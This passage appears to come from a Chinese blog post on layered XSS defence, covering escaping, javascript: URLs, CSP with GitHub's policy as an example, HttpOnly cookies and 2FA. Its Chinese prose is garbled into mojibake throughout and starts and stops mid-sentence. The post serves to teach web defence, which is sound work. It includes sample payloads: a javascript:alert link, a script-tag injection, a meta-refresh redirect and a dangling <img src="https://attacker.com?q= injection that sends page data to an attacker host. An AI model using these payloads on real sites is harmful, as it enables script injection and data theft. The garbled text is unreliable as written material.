éƒ½æœ‰åšåˆ°äº†ï¼Œä¾‹å¦‚èªª PHP çš„ htmlspecialcharsï¼š</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629700-8743df00-d0f1-11eb-937b-910934140e96.png\" alt=\"xss1\"></p>\n<p>é‚£é€™æ¨£å°±æ‰“å®Œæ”¶å·¥äº†å—ï¼Ÿé‚„æ²’ã€‚</p>\n<p>å› ç‚ºï¼Œåœ¨é€£çµè£¡çš„å…§å®¹åˆæ˜¯å¦å¤–ä¸€å›äº‹äº†ï¼Œä¾‹å¦‚èªªï¼š<code>&lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt;</code></p>\n<p>æœ‰ä¸€ç¨®æ±è¥¿å«åš JavaScript pseudo-protocolï¼Œå¯ä»¥åˆ©ç”¨ <code>javascript:</code> ä¾†åŸ·è¡Œ JS ç¨‹å¼ç¢¼ï¼Œåƒæ˜¯é€™æ¨£ï¼š<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;</code>ï¼Œåœ¨ä½¿ç”¨è€…é»æ“Šé€™å€‹é€£çµæ™‚ï¼Œå°±æœƒè·³å‡º alertã€‚</p>\n<p>è€Œ <code>javascript:alert(1)</code> é€™å¹¾å€‹å­—ï¼Œå®Œå…¨æ²’æœ‰åŒ…å«æˆ‘å€‘ä¸Šé¢éœ€è¦ escape çš„ç‰¹æ®Šå­—å…ƒ <code>&quot;'&lt;&gt;&amp;</code>ï¼Œæ‰€ä»¥åœ¨é€™å€‹ç‹€æ³æˆ‘å€‘éœ€è¦æœ‰ä¸åŒçš„ escape æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ç›´æ¥æª¢æŸ¥å…§å®¹ï¼ŒæŒ‡å®šé–‹é ­å¿…é ˆè¦æ˜¯ <code>http://</code> æˆ–æ˜¯ <code>http://</code> ä¹‹é¡çš„ã€‚</p>\n<p>é€™å°±æ˜¯æˆ‘å‰›å‰›è¬›çš„ï¼Œåœ¨ä¸åŒåœ°æ–¹ï¼Œéœ€è¦ç”¨ä¸åŒçš„æ–¹å¼ä¾†é€²è¡Œè·³è„«åŠé˜²ç¦¦ã€‚å¦‚æœéƒ½æ˜¯ç”¨åŒä¸€ç¨®çš„è©±ï¼Œæœ‰äº›åœ°æ–¹å°±æœƒå¤±æ•ˆã€‚</p>\n<p>æœ‰äº›äººçœ‹åˆ°é€™é‚Šæœƒæƒ³èªªï¼šã€Œé˜¿ï½ä¸ç”¨æ“”å¿ƒå•¦ï¼æˆ‘ç”¨çš„å‰ç«¯æ¡†æ¶éƒ½å¹«æˆ‘åšå¥½äº†ï¼Œé è¨­éƒ½æœƒ escape å•¦ï¼ä¸æœƒè¢« XSSã€</p>\n<p>é€™å€‹å®£ç¨±å¤§éƒ¨åˆ†æ˜¯å°çš„ï¼Œç¾åœ¨ç¢ºå¯¦å¾ˆå¤šå‰ç«¯çš„æ¡†æ¶æœƒè™•ç†é€™ä»¶äº‹ï¼Œä½†è¦ç‰¹åˆ¥æ³¨æ„æˆ‘å‰›å‰›æçš„ href çš„ä¾‹å­ï¼Œå› ç‚º <code>javascript:alert(1)</code> é€™å¹¾å€‹å­—å…ƒéƒ½ä¸æ˜¯ç‰¹æ®Šå­—å…ƒï¼Œæ‰€ä»¥è·³è„«å®Œé‚„æ˜¯é•·ä¸€æ¨£ï¼Œä¾ç„¶æœƒæœ‰é€™æ¨£çš„æ¼æ´ã€‚</p>\n<p>React åœ¨ v16.9 çš„æ™‚å€™å°±é‡å°é€™å€‹ case æ–°å¢äº†è­¦å‘Šï¼š<a href=\"https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls\">Deprecating javascript: URLs</a>ï¼Œä¸¦ä¸”åœ¨ä¹‹å¾Œçš„ release ä¸­æœƒè‡ªå‹•é˜»æ“‹é€™å€‹è¡Œç‚ºã€‚ä¸éæ ¹æ“šæ¸¬è©¦çš„çµæœï¼Œç›®å‰çš„ç‰ˆæœ¬ v17.0.2 åªæœƒè­¦å‘Šè€Œå·²ï¼Œé‚„ä¸æœƒé˜»æ“‹ã€‚</p>\n<p>é€™é‚Šæœ‰ä¸€äº›ç›¸é—œçš„è¨è«–ï¼š<a href=\"https://github.com/facebook/react/issues/16592\">React@16.9 block javascript:void(0); #16592</a> èˆ‡ <a href=\"https://github.com/facebook/react/issues/16382\">False-positive security precaution warning (javascript: URLs) #16382</a>ï¼Œæƒ³çœ‹ç¨‹å¼ç¢¼çš„è©±åœ¨é€™é‚Šï¼š<a href=\"https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js\">react/packages/react-dom/src/shared/sanitizeURL.js </a>ã€‚</p>\n<p>é™¤äº†çœ‹ä½¿ç”¨æƒ…å¢ƒè·³è„«ä¸æ˜¯ä»¶å®¹æ˜“çš„äº‹æƒ…ä»¥å¤–ï¼Œæ„è­˜åˆ°æœ‰å“ªäº›åœ°æ–¹æ˜¯ä½¿ç”¨è€…å¯ä»¥è‡ªå·±è¼¸å…¥çš„ä¹Ÿæ²’æœ‰æƒ³åƒä¸­ç°¡å–®ã€‚</p>\n<p>å› ç‚ºé™¤äº†è³‡æ–™åº«æˆ–è€…æ˜¯ API æ˜¯ä½ çš„è³‡æ–™ä¾†æºä¹‹å¤–ï¼ŒURL å¯èƒ½ä¹Ÿæ˜¯ã€‚æœ‰äº›ç¨‹å¼ç¢¼æœƒç›´æ¥æŠŠç¶²å€åˆ—ä¸Šçš„æŸå€‹ query string æ”¾åˆ° JS è£¡ï¼Œä¹‹å¾Œç›´æ¥æŠŠé€™å€‹è®Šæ•¸è¼¸å‡ºåˆ°ç•«é¢ä¸Šï¼Œé€™å°±æ˜¯ç„¡æ„é–“ä¿¡ä»»äº†ä¸è©²ä¿¡ä»»çš„è³‡æ–™ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œæœå°‹é é¢çš„ç¶²å€å¯èƒ½é•·é€™æ¨£ï¼š<code>https://example.com/search?q=hello</code>ï¼Œè€Œåœ¨ç¨‹å¼ä¸­æ˜¯é€™æ¨£å¯«çš„ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> q <span class=\"token operator\">=</span> <span class=\"token string\">'hello'</span> <span class=\"token comment\">// å¾ç¶²å€åˆ—æ‹¿ä¸‹ä¾†çš„åƒæ•¸</span><br>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.search'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> q</code></pre>\n<p>é€™æ™‚å¦‚æœä½ æŠŠ q æ›æˆ HTMLï¼š<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œåœ¨æ²’åšè·³è„«å°±è¼¸å‡ºçš„ç‹€æ³ä¸‹ï¼Œå°±æœƒæœ‰ XSS æ¼æ´çš„ç”¢ç”Ÿã€‚</p>\n<p>æœ€å¾Œå‘¢ï¼Œæœ‰äº›ç¶²ç«™æœƒå…è¨±å…§å®¹æœ‰éƒ¨åˆ†çš„ HTMLï¼Œæœ€å¸¸è¦‹çš„å°±æ˜¯éƒ¨è½æ ¼ï¼Œå› ç‚ºéƒ¨è½æ ¼è¦æœ‰æ¨£å¼å˜›ï¼Œé™¤éæ˜¯è‡ªè¨‚è³‡æ–™æ ¼å¼ï¼Œä¸ç„¶æœ‰äº›ç¶²ç«™éƒ½ç›´æ¥æŠŠå…§æ–‡å­˜æˆ HTMLï¼Œç„¶å¾Œç”¨ <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> æˆ–æ˜¯ <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a> ä¹‹é¡çš„å¥—ä»¶å»éæ¿¾ï¼ŒæŠŠä¸åˆæ³•çš„æ¨™ç±¤æˆ–æ˜¯å±¬æ€§éæ¿¾æ‰ã€‚</p>\n<p>é›–ç„¶èªªä½¿ç”¨é€™äº› library ç›¸å°å®‰å…¨ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ç‰ˆæœ¬è¦æ™‚å¸¸æ›´æ–°ï¼Œå› ç‚ºé€™é¡å‹çš„å¥—ä»¶ä¹Ÿå¯èƒ½æœƒæœ‰æ¼æ´çš„ç”¢ç”Ÿï¼ˆ<a href=\"https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/\">Mutation XSS via namespace confusion â€“ DOMPurify &lt; 2.0.17 bypass</a>ï¼‰ã€‚å¦å¤–ä¹Ÿéœ€è¦æ³¨æ„ä½¿ç”¨æ™‚çš„è¨­å®šï¼Œè¨­å®šéŒ¯èª¤çš„è©±ä¹Ÿæœ‰å¯èƒ½é€ æˆå•é¡Œï¼Œå¯¦éš›æ¡ˆä¾‹å¯ä»¥åƒè€ƒï¼š<a href=\"https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b\">é˜²æ­¢ XSS å¯èƒ½æ¯”æƒ³åƒä¸­å›°é›£</a>ã€‚</p>\n<p>ç¸½çµä¸€ä¸‹ï¼Œæƒ³è¦åšå¥½ç¬¬ä¸€é—œçš„ XSS é˜²ç¦¦ï¼Œéœ€è¦æ³¨æ„çš„äº‹æƒ…æœ‰ï¼š</p>\n<ol>\n<li>æ„è­˜åˆ°å“ªé‚Šæ˜¯ä½¿ç”¨è€…å¯ä»¥è‡ªå·±è¼¸å…¥è³‡æ–™çš„åœ°æ–¹</li>\n<li>é‡å°ä¸åŒæƒ…å¢ƒå»åš XSS çš„é˜²ç¦¦</li>\n</ol>\n<p>ä¹Ÿå¯ä»¥è€ƒæ…®å°å…¥ç¾æˆçš„ <a href=\"https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/\">WAF</a>ï¼ˆWeb Application Firewallï¼‰ï¼Œç›´æ¥å¹«ä½ æŠŠä¸€äº›çœ‹èµ·ä¾†å¾ˆå¯ç–‘çš„ payload æ“‹ä½ã€‚ä¸é WAF ä¹Ÿä¸æ˜¯ç™¾åˆ†ç™¾æœ‰æ•ˆï¼Œåªæ˜¯å¤šä¸€é“é˜²ç·šè€Œå·²ã€‚<br>\næˆ–æ˜¯ä¹Ÿå¯ä»¥é—œå¿ƒä¸€ä¸‹é€™å€‹æ¯”è¼ƒæ–°çš„æ±è¥¿ï¼š<a href=\"https://web.dev/trusted-types/\">Trusted Types</a>ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\">#</a> ç¬¬äºŒé—œï¼šé˜»æ­¢æƒ¡æ„ç¨‹å¼ç¢¼è¢«åŸ·è¡Œ</h2>\n<p>å‡è¨­ç¬¬ä¸€é—œè¢«çªç ´äº†ï¼Œæ”»æ“Šè€…å¯ä»¥åœ¨ç¶²ç«™ä¸Šæ’å…¥ä»»æ„ç¨‹å¼ç¢¼ï¼Œé€™æ™‚å€™è¦è€ƒæ…®çš„äº‹æƒ…å°±æ˜¯å¦‚ä½•é˜»æ­¢ç¨‹å¼ç¢¼è¢«åŸ·è¡Œã€‚</p>\n<p>é€™ä¸€é—œçš„é‡é»æ˜¯ CSPï¼ŒContent Security Policyã€‚</p>\n<p>CSP æ˜¯ä¸€ç³»åˆ—çš„è¦å‰‡ï¼Œç”¨ä¾†è·Ÿç€è¦½å™¨è¬›èªªå“ªäº›ä¾†æºçš„è³‡æºå¯ä»¥è¢«è¼‰å…¥ï¼Œå“ªäº›ä¸è¡Œï¼Œå¯ä»¥åˆ©ç”¨ response header æˆ–æ˜¯ <code>&lt;meta&gt;</code> tag ä¾†æŒ‡å®šé é¢çš„ CSP è¦å‰‡ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å¾ˆç¢ºå®šç¶²ç«™ä¸Šçš„ JS éƒ½ä¾†è‡ªæ–¼åŒä¸€å€‹ originï¼Œé‚£æˆ‘çš„ CSP å°±å¯ä»¥é€™æ¨£å¯«ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token operator\">:</span> <span class=\"token keyword\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span></code></pre>\n<p><code>self</code> ä»£è¡¨çš„æ˜¯ same origin çš„æ„æ€ã€‚é€™æ¨£å¯«çš„è©±ï¼Œå¦‚æœä½ è©¦è‘—è¼‰å…¥ä¸æ˜¯ç•¶å‰ origin çš„ JSï¼Œæˆ–è€…æ˜¯ç›´æ¥åœ¨é é¢ä¸Šç”¨ inline çš„æ–¹å¼åŸ·è¡Œ scriptï¼Œéƒ½æœƒçœ‹åˆ°ç€è¦½å™¨å ±éŒ¯ï¼š</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629705-8f038380-d0f1-11eb-851d-04ed70c19317.png\" alt=\"xss2\"></p>\n<p>CSP å¯ä»¥åˆ¶å®šè¨±å¤šä¸åŒè³‡æºçš„è¦å‰‡ï¼Œéœ€è¦æ›´è©³ç´°çš„è§£é‡‹å¯ä»¥çœ‹é€™é‚Šï¼š<a href=\"https://content-security-policy.com/\">Content Security Policy Reference</a>ã€‚æƒ³æ‰¾åˆ°æ¯”è¼ƒå®Œæ•´çš„ CSPï¼Œå»çœ‹ä¸€äº›å¤§å…¬å¸çš„å¯¦ä½œæ˜¯æœ€å¿«çš„ï¼Œæ¥è‘—æˆ‘å€‘ç›´æ¥ä¾†çœ‹ä¸€ä¸‹ GitHub çš„ CSP é•·ä»€éº¼æ¨£å­ï¼ˆç‚ºäº†æ–¹ä¾¿é–±è®€ï¼Œæœ‰é‡æ–°æ’ç‰ˆéï¼‰ï¼š</p>\n<pre class=\"language-csp\"><code class=\"language-csp\"><span class=\"token directive keyword\">default-src</span> <span class=\"token safe selector\">'none'</span><br><br><span class=\"token directive keyword\">base-uri</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">block-all-mixed-content</span>;<br><br><span class=\"token directive keyword\">connect-src</span> <span class=\"token safe selector\">'self'</span> uploads.github.com www.githubstatus.com collector.githubapp.com<br>api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com<br>github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com<br>html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com<br><span class=\"token unsafe function\">*</span>.actions.githubusercontent.com wss://<span class=\"token unsafe function\">*</span>.actions.githubusercontent.com online.visualstudio.com/api/v1/locations<br>insights.github.com;<br><br><span class=\"token directive keyword\">font-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">form-action</span> <span class=\"token safe selector\">'self'</span> github.com gist.github.com;<br><br><span class=\"token directive keyword\">frame-ancestors</span> <span class=\"token safe selector\">'none'</span>;<br><br><span class=\"token directive keyword\">frame-src</span> render.githubusercontent.com;<br><br><span class=\"token directive keyword\">img-src</span> <span class=\"token safe selector\">'self'</span> data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com<br>secured-user-images.githubusercontent.com/ <span class=\"token unsafe function\">*</span>.githubusercontent.com;<br><br><span class=\"token directive keyword\">manifest-src</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">media-src</span> github.com user-images.githubusercontent.com/;<br><br><span class=\"token directive keyword\">script-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">style-src</span> <span class=\"token unsafe function\">'unsafe-inline'</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">worker-src</span> github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js</code></pre>\n<p>æƒ³è¦æª¢æŸ¥ CSP è¦å‰‡æœ‰æ²’æœ‰æ˜é¡¯æ¼æ´çš„è©±ï¼Œå¯ä»¥åˆ° <a href=\"https://csp-evaluator.withgoogle.com/\">CSP Evaluator</a>ï¼Œè€Œ GitHub çš„ CSP è¨­ç½®å¾—å¾ˆåš´è¬¹ï¼Œå¹¾ä¹æ¯ä¸€ç¨®è³‡æºéƒ½æœ‰è¨­å®šã€‚</p>\n<p>é€™é‚Šå¯ä»¥çœ‹åˆ° script-src çš„å€¼åªæœ‰ <code>github.githubassets.com</code>ã€‚å› ç‚ºæ²’æœ‰ <code>unsafe-inline</code> çš„é—œä¿‚ï¼Œæ‰€ä»¥ inline script ç„¡æ³•åŸ·è¡Œï¼Œè€Œå¼•å…¥ script çš„è©±ä¹Ÿåªèƒ½å¾ <code>github.githubassets.com</code> é€™å€‹ä¾†æºå¼•å…¥ï¼Œå¹¾ä¹å°æ­»äº†åŸ·è¡Œ script çš„è·¯ã€‚</p>\n<p>è€Œè¨±å¤šç¶²ç«™çš„ CSP å…¶å¯¦ä¸¦ä¸æœƒè¨­ç½®å¾—é€™éº¼åš´æ ¼ï¼Œå°±æœ‰æ¯”è¼ƒé«˜çš„æ©Ÿç‡æœƒè¢«ç¹éï¼Œä¾‹å¦‚èªª <a href=\"https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html\">A Wormable XSS on HackMD!</a> ç›´æ¥ç”¨ cloudflare CDN ä¸Šçš„ AngularJS + CSTI ç¹éï¼›<a href=\"https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md\">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a> å‰‡æ˜¯ç”¨ Google Tag Manager ä¾†ç¹ã€‚</p>\n<p>å¦å¤–ï¼Œåœ¨æŸäº›æƒ…å¢ƒä¹‹ä¸‹å°±ç®—ä¹çœ‹è¢«å°æ­»ï¼Œä¾ç„¶å¯ä»¥é€éç¾æœ‰çš„ script ä¾†å¹«ä½ ç¹éï¼Œè©³ç´°è³‡è¨Šå¯ä»¥åƒè€ƒé€™å€‹å¾ˆç¶“å…¸çš„æ¼”è¬›ï¼š<a href=\"https://github.com/google/security-research-pocs/tree/master/script-gadgets\">Breaking XSS mitigations via Script gadgets</a>ã€‚</p>\n<p>é‚£å¦‚æœçœŸçš„æ²’è¾¦æ³•åŸ·è¡Œ scriptï¼Œé‚„æœ‰ä»€éº¼å¯ä»¥åšçš„å‘¢ï¼Ÿ</p>\n<p>å°±ç®—åªæ˜¯æ’å…¥ HTMLï¼Œä¹Ÿé‚„æ˜¯å¯ä»¥åšäº‹çš„ã€‚</p>\n<p>ä¾‹å¦‚èªªå¯ä»¥åˆ©ç”¨æ’å…¥ HTML meta tag ä¾†é€ æˆé‡æ–°å°å‘ï¼ŒæŠŠä½¿ç”¨è€…å°åˆ°æƒ¡æ„ç¶²ç«™å»ï¼Œåƒé€™æ¨£ï¼š<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;</code>ã€‚</p>\n<p>æˆ–è€…æ˜¯æ’å…¥ <code>&lt;img src=&quot;https://attacker.com?q=</code>ï¼ˆæ³¨æ„é€™é‚Š src çš„é›™å¼•è™Ÿåªæœ‰é–‹é ­ï¼‰ï¼Œè®“æ•´æ®µ HTML è®Šæˆï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://attacker.com?q=<br>&lt;div>user info&lt;/div><br>&lt;div>sensitive data&lt;/div><br>&lt;div class=<span class=\"token punctuation\">\"</span></span><span class=\"token attr-name\">test\"</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>è—‰ç”± src æ²’æœ‰é–‰åˆçš„ <code>&quot;</code>ï¼Œå°±å¯ä»¥æ‹¿åˆ°ä¸‹ä¸€å€‹ <code>&quot;</code> ç‚ºæ­¢çš„ HTML å…§å®¹ï¼ŒæŠŠé€™äº›ç•¶ä½œ query string çš„ä¸€éƒ¨åˆ†å‚³åˆ° serverï¼Œè€Œé€™ä¸­é–“å¯èƒ½å°±æœƒæœ‰ä¸€äº›æ•æ„Ÿè³‡æ–™çš„å­˜åœ¨ã€‚æ‰€ä»¥ <code>img-src</code> çš„ CSP è¦å‰‡ä¹Ÿæ˜¯æœ‰ç”¨è™•çš„ï¼Œå¯ä»¥é˜²æ­¢é€™é¡å‹çš„æ”»æ“Šã€‚</p>\n<p>æˆ–ä¹Ÿå¯ä»¥çµåˆ <a href=\"https://blog.huli.tw/2021/01/23/dom-clobbering/\">DOM Clobbering</a>ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰ä»€éº¼åœ°æ–¹å¯ä»¥æ”»æ“Šã€‚</p>\n<p>å› æ­¤ï¼Œå°±ç®—ä¸èƒ½åŸ·è¡Œ scriptï¼Œä¾ç„¶æœ‰å…¶ä»–æ”»æ“Šæ‰‹æ³•å¯ä»¥ç”¨ã€‚</p>\n<p>GitHub åœ¨ 2017 å¹´æ™‚æœ‰å¯«éä¸€ç¯‡ <a href=\"https://github.blog/2017-01-19-githubs-post-csp-journey/\">GitHubâ€™s post-CSP journey</a>ï¼Œç‰¹åˆ¥è¬›äº†ä»–å€‘çš„ CSP æ˜¯æ€éº¼è¨­è¨ˆçš„ï¼Œæ˜¯ç‚ºäº†é˜²ç¯„å“ªäº›å·²çŸ¥çš„æ”»æ“Šï¼Œå¯«å¾—éå¸¸ä¸éŒ¯ã€‚ä»–å€‘ç”šè‡³é‚„æœ‰ä¸€å€‹ bug bounty æ˜¯ <a href=\"https://bounty.github.com/targets/csp.html\">GitHub CSP</a>ï¼Œå°±ç®—æ²’æœ‰æ‰¾åˆ° XSS ä¹Ÿæ²’æœ‰é—œä¿‚ï¼Œåªè¦æå‡ºèƒ½ç¹é CSP çš„æ‰‹æ³•å°±å¯ä»¥æ‹¿åˆ°çé‡‘ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\">#</a> ç¬¬ä¸‰é—œï¼šé™ä½ XSS æ”»æ“Šä¹‹æå®³</h2>\n<p>å¦‚æœè¡—äº­è·Ÿå‰å…©é—œéƒ½æ²’å®ˆä½ï¼ŒXSS å‹¢åœ¨å¿…è¡Œçš„è©±ï¼Œæ¥ä¸‹ä¾†è¦æ€è€ƒçš„å°±æ˜¯è©²å¦‚ä½•é™ä½ XSS æ”»æ“Šä¹‹æå®³ã€‚</p>\n<p>é€™é‚Šæˆ‘è¦ºå¾—æœ‰å…©å€‹é¢å‘å¯ä»¥å»æ€è€ƒï¼š</p>\n<ol>\n<li>é¿å…æ”»æ“Šè€…ç”¨å—å®³è€…çš„èº«ä»½ç™»å…¥</li>\n<li>é¿å…æ”»æ“Šè€…é€é XSS é€²è¡Œæ¯”è¼ƒé‡è¦çš„æ“ä½œ</li>\n</ol>\n<p>å…ˆä¾†è«‡ç¬¬ä¸€ç¨®ï¼Œæœ‰ä¸€ç¨®æœ€å¸¸è¦‹çš„æ”»æ“Šæ–¹å¼å°±æ˜¯å· cookieï¼ŒæŠŠ document.cookie å·èµ°ä¹‹å¾Œï¼Œè‹¥æ˜¯ä½¿ç”¨è€…é©—è­‰èº«ä»½çš„ token åœ¨è£¡é¢ï¼Œå°±å¯ä»¥ç›´æ¥ç”¨å—å®³è€…çš„èº«ä»½ç™»å…¥ã€‚å› æ­¤é€™ç¨®é©—è­‰ç”¨çš„ cookieï¼Œè«‹è¨˜å¾—è¨­å®š <code>HttpOnly</code>ï¼Œå°±èƒ½ç¢ºä¿å‰ç«¯ç„¡æ³•ç›´æ¥ç”¨ document.cookie å°±å–å¾— cookieã€‚</p>\n<p>å¦‚æœå› ç‚ºå„ç¨®åŸå› æ²’è¾¦æ³•ä¿è­·ä½¿ç”¨è€…çš„ tokenï¼Œé‚£å°±å¯ä»¥å†è¨­ä¸‹å…¶ä»–é—œå¡ï¼Œä¾‹å¦‚èªªæœ€å¸¸è¦‹çš„å°±æ˜¯åœ°é»çš„æª¢æŸ¥ã€‚å‡è¨­ä¸€å€‹ä½¿ç”¨è€…ä¸€ç›´ä»¥ä¾†éƒ½åœ¨å°ç£ï¼Œå¯æ˜¯å»çªç„¶åœ¨çƒå…‹è˜­ç™¼äº†ä¸€å€‹ requestï¼Œé€™æ™‚å°±å¯ä»¥å…ˆæŠŠé€™å€‹æ“ä½œæ“‹ä½ï¼Œä¸¦å¯„ä¿¡å‘ŠçŸ¥ä½¿ç”¨è€…æœ‰å¯ç–‘æ“ä½œï¼Œéº»ç…©ä»–ç¢ºèªæ˜¯å¦ç‚ºæœ¬äººã€‚æˆ–ä¹Ÿå¯ä»¥æª¢æŸ¥ä½¿ç”¨è€…çš„ç€è¦½å™¨æ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´çš„è©±ä¸€æ¨£è¦å…ˆç¶“éç¢ºèªï¼ŒåŠ ä¸Šå¦ä¸€é“æ‰‹çºŒä¾†ä¿éšœä½¿ç”¨è€…çš„å®‰å…¨ã€‚</p>\n<p>å†ä¾†è«‡ç¬¬äºŒç¨®ï¼Œå°±ç®— cookie æ²’è¢«å·èµ°ï¼Œå› ç‚ºæ”»æ“Šè€…å·²ç¶“èƒ½åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼äº†ï¼Œæ‰€ä»¥ç›´æ¥æ‰“å¾Œç«¯ API é‚„æ˜¯åšå¾—åˆ°çš„ï¼Œè€Œä¸” cookie æœƒè‡ªå‹•å¸¶ä¸Šã€‚å› æ­¤åªè¦æ˜¯ä½¿ç”¨è€…å¯ä»¥åšçš„æ“ä½œï¼Œæ”»æ“Šè€…åŸºæœ¬ä¸Šéƒ½åšå¾—åˆ°ã€‚</p>\n<p>ä»¥éƒ¨è½æ ¼å¹³å°ä¾†èªªçš„è©±ï¼Œç™¼æ–‡ã€ç·¨è¼¯æ–‡ç« æˆ–æ˜¯åˆªæ–‡éƒ½æ˜¯åšå¾—åˆ°çš„ï¼Œæ”»æ“Šè€…å°±åªè¦ç›´æ¥åˆ©ç”¨ XSS å»æ‰“ API å°±è¡Œäº†ã€‚</p>\n<p>é€™æ™‚å€™å°æ–¼ä¸€äº›æ¯”è¼ƒé‡è¦çš„æ“ä½œï¼Œå°±æ‡‰è©²è¨­ç½®ç¬¬äºŒé“é—œå¡ï¼Œä¾‹å¦‚èªªæ›´æ”¹å¯†ç¢¼éœ€è¦è¼¸å…¥åŸå¯†ç¢¼ï¼Œé‚£é€™æ¨£å› ç‚ºæ”»æ“Šè€…ä¸çŸ¥é“åŸå¯†ç¢¼æ˜¯ä»€éº¼ï¼Œæ‰“ API ä¹Ÿæ²’æœ‰ç”¨ã€‚æˆ–è€…æ˜¯è¦è½‰å¸³çš„æ™‚å€™éœ€è¦ç”¨æ‰‹æ©Ÿæ¥æ”¶é©—è­‰ç¢¼ï¼Œæ²’æœ‰æ‰‹æ©Ÿçš„è©±å°±ç„¡æ³•åŸ·è¡Œæ“ä½œã€‚</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629715-96c32800-d0f1-11eb-971b-10f405ebd010.png\" alt=\"xss3\"></p>\n<p>å…¶å¯¦èªªç™½è©±ä¸€é»å°±æ˜¯ 2FAï¼ˆTwo-factor authenticationï¼‰å•¦ã€‚å°æ–¼é€™äº›é‡è¦æ“ä½œï¼Œé™¤äº†ç™»å…¥ä¹‹å¤–é‚„è¦è¨­ä¸‹ç¬¬äºŒç¨®å¯ä»¥ç¢ºèªæ˜¯æœ¬äººçš„æ©Ÿåˆ¶ï¼Œé€™æ¨£å°±ç®—è¢«æ‰“å‡º XSSï¼Œæ”»æ“Šè€…ä¹Ÿç„¡æ³•åŸ·è¡Œé€™äº›æ“ä½œï¼Œå¯ä»¥è®“æå®³é™ä½ã€‚</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>è³‡å®‰çš„ä¸–ç•Œæ—¢å»£åˆæ·±ï¼Œé€™ç¯‡æåˆ°çš„éƒ½åªæ˜¯å¤§æ–¹å‘çš„æ¦‚è§€è€Œå·²ã€‚è‹¥æ˜¯å†æ·±å…¥ä¸‹å»ï¼Œæ¯å€‹ç’°ç¯€éƒ½å¯ä»¥å†è®Šæˆå¤šå€‹ç¨ç«‹çš„ä¸»é¡Œï¼Œè€Œä¸”ä¹Ÿå¯ä»¥çµåˆå…¶ä»–çš„æ”»æ“Šï¼Œä¾‹å¦‚èªªï¼š</p>\n<ol>\n<li>è‡ªè¨‚çš„ XSS 